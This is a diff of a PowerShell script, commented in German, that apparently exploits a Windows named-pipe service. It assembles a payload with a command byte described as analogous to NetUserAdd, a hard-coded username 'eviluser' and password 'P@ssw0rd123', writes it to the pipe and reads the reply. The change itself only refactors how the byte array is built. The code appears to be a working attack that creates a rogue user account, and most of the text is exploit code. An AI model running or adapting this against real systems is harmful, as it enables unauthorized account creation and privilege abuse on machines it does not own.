@@ -14,26 +14,27 @@ try {
         # Befehl "4" (NetUserAdd analog)
         $cmd = 0x34  # ASCII "4"
 
-        # Nutzdaten (vermutlich USER_INFO_1 Struktur)
+        # Nutzdaten vorbereiten
         $username = "eviluser" + [char]0
         $password = "P@ssw0rd123" + [char]0
         $flags = [BitConverter]::GetBytes(0x00000001)  # UF_SCRIPT
 
-        # Gesamtpaket vorbereiten
-        $payload = @()
-        $payload += $cmd
-        $payload += [System.Text.Encoding]::ASCII.GetBytes($username)
-        $payload += [System.Text.Encoding]::ASCII.GetBytes($password)
-        $payload += $flags
+        # Byte-Array zusammenbauen
+        $payload = New-Object System.Collections.Generic.List[Byte]
+        $payload.Add($cmd)
+        $payload.AddRange([System.Text.Encoding]::ASCII.GetBytes($username))
+        $payload.AddRange([System.Text.Encoding]::ASCII.GetBytes($password))
+        $payload.AddRange($flags)
 
-        $writer.Write($payload, 0, $payload.Length)
+        # Senden
+        $writer.Write($payload.ToArray())
         $writer.Flush()
 
         Write-Host "[*] Daten gesendet. Warte auf Antwort ..."
 
         Start-Sleep -Milliseconds 500
 
-        # Antwort lesen (sofern vorhanden)
+        # Antwort lesen
         $reader = New-Object System.IO.BinaryReader($pipe)
         $response = $reader.ReadBytes(1024)
 
